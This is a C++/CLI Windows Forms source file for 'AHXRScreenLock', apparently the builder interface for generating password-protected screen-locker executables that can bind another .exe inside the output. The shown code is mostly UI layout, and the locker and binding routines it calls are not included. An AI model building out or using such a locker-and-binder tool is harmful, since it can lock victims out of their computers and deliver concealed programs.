/*
	@title
		AHXRScreenLock
	@author
		AHXR (https://github.com/AHXR)
	@copyright
		2017

	AHXRScreenLock is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	AHXRScreenLock is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with AHXRScreenLock.  If not, see <http://www.gnu.org/licenses/>.
*/
//=========================================
#pragma once

namespace AHXRScreenLock {

	using namespace System;
	using namespace System::ComponentModel;
	using namespace System::Collections;
	using namespace System::Windows::Forms;
	using namespace System::Data;
	using namespace System::Drawing;

	/// <summary>
	/// Summary for frmMain
	/// </summary>
	public ref class frmMain : public System::Windows::Forms::Form
	{
	public:
		frmMain(void)
		{
			InitializeComponent();
			//
			//TODO: Add the constructor code here
			//
		}

	protected:
		/// <summary>
		/// Clean up any resources being used.
		/// </summary>
		~frmMain()
		{
			if (components)
			{
				delete components;
			}
		}
	private: System::Windows::Forms::GroupBox^  grpPassword;
	protected:
	private: System::Windows::Forms::CheckBox^  chkMask;
	private: System::Windows::Forms::TextBox^  txtPassword;
	private: System::Windows::Forms::GroupBox^  grpMessage;
	private: System::Windows::Forms::TextBox^  txtMessage;
	private: System::Windows::Forms::Button^  btnBuild;
	private: System::Windows::Forms::SaveFileDialog^  saveFileDialog;
	private: System::Windows::Forms::ProgressBar^  pgBar;
	private: System::Windows::Forms::OpenFileDialog^  attachDialog;
	private: System::Windows::Forms::Button^  btnAttach;


	private:
		/// <summary>
		/// Required designer variable.
		/// </summary>
		System::ComponentModel::Container ^components;

#pragma region Windows Form Designer generated code
		/// <summary>
		/// Required method for Designer support - do not modify
		/// the contents of this method with the code editor.
		/// </summary>
		void InitializeComponent(void)
		{
			this->grpPassword = (gcnew System::Windows::Forms::GroupBox());
			this->chkMask = (gcnew System::Windows::Forms::CheckBox());
			this->txtPassword = (gcnew System::Windows::Forms::TextBox());
			this->grpMessage = (gcnew System::Windows::Forms::GroupBox());
			this->txtMessage = (gcnew System::Windows::Forms::TextBox());
			this->btnBuild = (gcnew System::Windows::Forms::Button());
			this->saveFileDialog = (gcnew System::Windows::Forms::SaveFileDialog());
			this->pgBar = (gcnew System::Windows::Forms::ProgressBar());
			this->attachDialog = (gcnew System::Windows::Forms::OpenFileDialog());
			this->btnAttach = (gcnew System::Windows::Forms::Button());
			this->grpPassword->SuspendLayout();
			this->grpMessage->SuspendLayout();
			this->SuspendLayout();
			// 
			// grpPassword
			// 
			this->grpPassword->Controls->Add(this->chkMask);
			this->grpPassword->Controls->Add(this->txtPassword);
			this->grpPassword->Location = System::Drawing::Point(13, 13);
			this->grpPassword->Name = L"grpPassword";
			this->grpPassword->Size = System::Drawing::Size(436, 58);
			this->grpPassword->TabIndex = 0;
			this->grpPassword->TabStop = false;
			this->grpPassword->Text = L"Password";
			// 
			// chkMask
			// 
			this->chkMask->AutoSize = true;
			this->chkMask->Checked = true;
			this->chkMask->CheckState = System::Windows::Forms::CheckState::Checked;
			this->chkMask->Location = System::Drawing::Point(381, 22);
			this->chkMask->Name = L"chkMask";
			this->chkMask->Size = System::Drawing::Size(49, 17);
			this->chkMask->TabIndex = 2;
			this->chkMask->Text = L"Mask";
			this->chkMask->UseVisualStyleBackColor = true;
			this->chkMask->CheckedChanged += gcnew System::EventHandler(this, &frmMain::chkMask_CheckedChanged);
			// 
			// txtPassword
			// 
			this->txtPassword->Location = System::Drawing::Point(6, 20);
			this->txtPassword->MaxLength = 16;
			this->txtPassword->Name = L"txtPassword";
			this->txtPassword->Size = System::Drawing::Size(369, 20);
			this->txtPassword->TabIndex = 1;
			this->txtPassword->UseSystemPasswordChar = true;
			// 
			// grpMessage
			// 
			this->grpMessage->Controls->Add(this->txtMessage);
			this->grpMessage->Location = System::Drawing::Point(13, 77);
			this->grpMessage->Name = L"grpMessage";
			this->grpMessage->Size = System::Drawing::Size(436, 54);
			this->grpMessage->TabIndex = 1;
			this->grpMessage->TabStop = false;
			this->grpMessage->Text = L"Message";
			// 
			// txtMessage
			// 
			this->txtMessage->Location = System::Drawing::Point(6, 19);
			this->txtMessage->MaxLength = 20;
			this->txtMessage->Multiline = true;
			this->txtMessage->Name = L"txtMessage";
			this->txtMessage->Size = System::Drawing::Size(424, 22);
			this->txtMessage->TabIndex = 3;
			// 
			// btnBuild
			// 
			this->btnBuild->Location = System::Drawing::Point(13, 137);
			this->btnBuild->Name = L"btnBuild";
			this->btnBuild->Size = System::Drawing::Size(332, 23);
			this->btnBuild->TabIndex = 2;
			this->btnBuild->Text = L"Build";
			this->btnBuild->UseVisualStyleBackColor = true;
			this->btnBuild->Click += gcnew System::EventHandler(this, &frmMain::btnBuild_Click);
			// 
			// saveFileDialog
			// 
			this->saveFileDialog->Filter = L"EXE Files|*.exe";
			this->saveFileDialog->Title = L"File Name";
			this->saveFileDialog->FileOk += gcnew System::ComponentModel::CancelEventHandler(this, &frmMain::saveFileDialog_FileOk);
			// 
			// pgBar
			// 
			this->pgBar->Location = System::Drawing::Point(14, 166);
			this->pgBar->Name = L"pgBar";
			this->pgBar->Size = System::Drawing::Size(436, 23);
			this->pgBar->TabIndex = 3;
			// 
			// attachDialog
			// 
			this->attachDialog->FileName = L"openFileDialog1";
			this->attachDialog->Filter = L"exe files|*.exe";
			this->attachDialog->FileOk += gcnew System::ComponentModel::CancelEventHandler(this, &frmMain::attachDialog_FileOk);
			// 
			// btnAttach
			// 
			this->btnAttach->Location = System::Drawing::Point(351, 137);
			this->btnAttach->Name = L"btnAttach";
			this->btnAttach->Size = System::Drawing::Size(92, 23);
			this->btnAttach->TabIndex = 4;
			this->btnAttach->Text = L"Attach .exe";
			this->btnAttach->UseVisualStyleBackColor = true;
			this->btnAttach->Click += gcnew System::EventHandler(this, &frmMain::btnAttach_Click);
			// 
			// frmMain
			// 
			this->AutoScaleDimensions = System::Drawing::SizeF(6, 13);
			this->AutoScaleMode = System::Windows::Forms::AutoScaleMode::Font;
			this->ClientSize = System::Drawing::Size(461, 204);
			this->Controls->Add(this->btnAttach);
			this->Controls->Add(this->pgBar);
			this->Controls->Add(this->btnBuild);
			this->Controls->Add(this->grpMessage);
			this->Controls->Add(this->grpPassword);
			this->MaximizeBox = false;
			this->MaximumSize = System::Drawing::Size(469, 232);
			this->MinimumSize = System::Drawing::Size(469, 232);
			this->Name = L"frmMain";
			this->Text = L"AXHRScreenLock";
			this->grpPassword->ResumeLayout(false);
			this->grpPassword->PerformLayout();
			this->grpMessage->ResumeLayout(false);
			this->grpMessage->PerformLayout();
			this->ResumeLayout(false);

		}
#pragma endregion
	private: System::Void chkMask_CheckedChanged(System::Object^  sender, System::EventArgs^  e) {
		this->txtPassword->UseSystemPasswordChar = this->chkMask->Checked;
	}
	private: System::Void btnBuild_Click(System::Object^  sender, System::EventArgs^  e) {
		this->saveFileDialog->ShowDialog();
	}
	private: System::Void saveFileDialog_FileOk(System::Object^  sender, System::ComponentModel::CancelEventArgs^  e) {

		std::string
			s_file = marshal_as< std::string >(this->saveFileDialog->FileName);

		this->pgBar->Value = 25;
		buildNewLocker(s_file);
		this->pgBar->Value = 65;
		packLocker(s_file, marshal_as< std::string >(this->txtPassword->Text), marshal_as< std::string >(this->txtMessage->Text));
		this->pgBar->Value = 80;
		if ( !s_attached_p.empty() ) {
			attachExecutable(s_file, s_attached_p);
		}

		this->pgBar->Value = 100;

		MessageBox::Show("Done");
	}
private: System::Void btnAttach_Click(System::Object^  sender, System::EventArgs^  e) {
	this->attachDialog->ShowDialog();
}
private: System::Void attachDialog_FileOk(System::Object^  sender, System::ComponentModel::CancelEventArgs^  e) {
	s_attached_p = marshal_as< std::string >(this->attachDialog->FileName);
}
};
}
